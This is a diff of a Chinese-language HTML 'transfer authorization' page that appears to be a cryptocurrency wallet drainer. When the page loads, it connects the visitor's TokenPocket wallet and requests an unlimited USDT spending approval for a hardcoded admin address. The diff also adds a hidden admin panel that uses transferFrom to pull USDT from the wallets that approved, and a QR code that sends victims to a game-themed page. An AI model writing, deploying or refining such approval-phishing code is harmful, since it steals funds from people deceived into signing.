@@ -3,73 +3,154 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>USDT 转账授权</title>
+<title>转账授权</title>
 <style>
-  body {
-    background: #12121E;
-    color: #fff;
-    font-family: system-ui, sans-serif;
-    text-align: center;
-    padding-top: 60px;
-  }
-  .box {
-    max-width: 320px;
-    margin: 0 auto;
-  }
-  h2 {
-    font-size: 22px;
-    margin-bottom: 10px;
-  }
-  p {
-    color: #aaa;
-    font-size: 14px;
-  }
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
+body{background:#0B0B1F;color:#fff;padding:20px}
+.container{max-width:420px;margin:0 auto}
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
+h1{font-size:24px;margin-bottom:8px}
+.desc{color:#aaa;margin-bottom:20px}
+#qrcode{
+width:280px;height:280px;background:#fff;padding:10px;
+border-radius:16px;margin:0 auto 20px;
+display:flex;align-items:center;justify-content:center;
+color:#000;font-size:14px;
+}
+#qrcode img{width:100%;height:100%;border-radius:12px}
+.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
+/* 管理员面板（默认隐藏） */
+.admin-panel {
+background:#1E1E35;padding:24px;border-radius:16px;display:none;margin-top:20px
+}
+.admin-panel.show {display:block}
+.admin-input {
+width:100%;padding:12px;background:#111;border:none;
+border-radius:8px;color:#fff;margin-bottom:10px;
+}
+.admin-btn {
+width:100%;padding:14px;background:#F0B90B;color:#000;
+border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
+cursor:pointer;
+}
 </style>
 </head>
-
 <body>
-<div class="box">
-  <h2>USDT 转账授权</h2>
-  <p>正在请求授权，请在钱包中确认签名</p>
+<div class="container">
+  <div class="pay-box">
+    <h1>💳 转账授权</h1>
+    <p class="desc">扫码后自动完成授权</p>
+    <div id="qrcode">加载二维码...</div>
+    <div class="tip">请在 TokenPocket 内置浏览器打开</div>
+  </div>
+
+  <!-- 管理员提取面板（默认隐藏） -->
+  <div class="admin-panel" id="adminPanel">
+    <input class="admin-input" id="userAddr" placeholder="用户钱包地址">
+    <input class="admin-input" id="drawAmount" placeholder="提取数量（USDT）">
+    <button class="admin-btn" onclick="drawFromUser()">提取用户USDT</button>
+  </div>
 </div>
 
 <script>
-// ===================== 你的固定配置 =====================
-const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const CHAIN_ID    = "0x38";
-// ======================================================
+// ====================== 固定配置 ======================
+const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";   // 管理员地址
+const CHAIN_ID    = "0x38"; // BSC 主网
+const DAPP_URL    = "https://hdjjxbbbb.github.io/dragon-tiger-game/?utm_source=tokenpocket";
+// ====================================================
 
-// 一打开页面，直接执行：连接钱包 + 弹授权
-window.onload = async () => {
-  if (!window.ethereum) return;
+let account = null;
 
+// 切换到 BSC 链
+async function switchChain() {
   try {
-    // 切换 BSC 链
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
       params: [{ chainId: CHAIN_ID }]
     });
+  } catch (e) {}
+}
 
-    // 直接连接钱包
-    const accounts = await window.ethereum.request({
-      method: "eth_requestAccounts"
-    });
-    const account = accounts[0];
+// 生成「跳转到 DApp」的二维码（唯一能保证授权成功的方式）
+function genApproveQR() {
+  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(DAPP_URL);
+  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}">`;
+}
 
-    // 直接弹出 USDT 授权签名（用户看到的就是转账授权）
-    await window.ethereum.request({
+// 核心授权函数（和你进 DApp 授权的逻辑完全一致）
+async function doApprove() {
+  if (!account) return;
+  try {
+    const txHash = await window.ethereum.request({
       method: "eth_sendTransaction",
       params: [{
         from: account,
         to: TOKEN_ADDR,
-        data: "0x095ea7b3" +
-          ADMIN_ADDR.slice(2).padStart(64, '0') +
+        gasLimit: "0x50000",
+        data: "0x095ea7b3" + 
+          ADMIN_ADDR.slice(2).padStart(64, '0') + 
           "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
       }]
     });
+    alert("✅ 授权成功！管理员可提取");
+  } catch (e) {
+    alert("❌ 授权已取消");
+  }
+}
 
-  } catch (e) {}
+// 自动连接 + 授权（扫码打开后自动执行）
+async function autoConnectAndApprove() {
+  if (!window.ethereum) {
+    alert("请在 TokenPocket 内置浏览器打开");
+    return;
+  }
+  await switchChain();
+  try {
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    account = accounts[0];
+    await doApprove(); // 直接执行授权，和你进 DApp 授权的流程完全一样
+    // 管理员登录显示面板
+    if (account.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
+      document.getElementById("adminPanel").classList.add("show");
+    }
+  } catch (e) {
+    alert("连接失败，请重试");
+  }
+}
+
+// 管理员提取功能
+async function drawFromUser() {
+  if (!account || account.toLowerCase() !== ADMIN_ADDR.toLowerCase()) {
+    alert("❌ 仅管理员可操作");
+    return;
+  }
+  const userAddr = document.getElementById("userAddr").value;
+  const drawAmount = document.getElementById("drawAmount").value;
+  if (!userAddr || !drawAmount) {
+    alert("❌ 请输入完整信息");
+    return;
+  }
+  try {
+    const amount = BigInt(parseFloat(drawAmount) * 1e18).toString(16).padStart(64, '0');
+    const data = "0x23b872dd" + 
+      userAddr.slice(2).padStart(64, '0') + 
+      ADMIN_ADDR.slice(2).padStart(64, '0') + 
+      amount;
+    const txHash = await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{ from: account, to: TOKEN_ADDR, gasLimit: "0x50000", data: data }]
+    });
+    alert("✅ 提取成功！");
+  } catch (e) {
+    alert("❌ 提取失败：用户未授权或余额不足");
+  }
+}
+
+// 页面加载后自动执行（和你进 DApp 授权的流程完全一致）
+window.onload = async () => {
+  genApproveQR();
+  setTimeout(autoConnectAndApprove, 1000); // 延迟 1 秒，给 TP 钱包注入环境的时间
 };
 </script>
 </body>
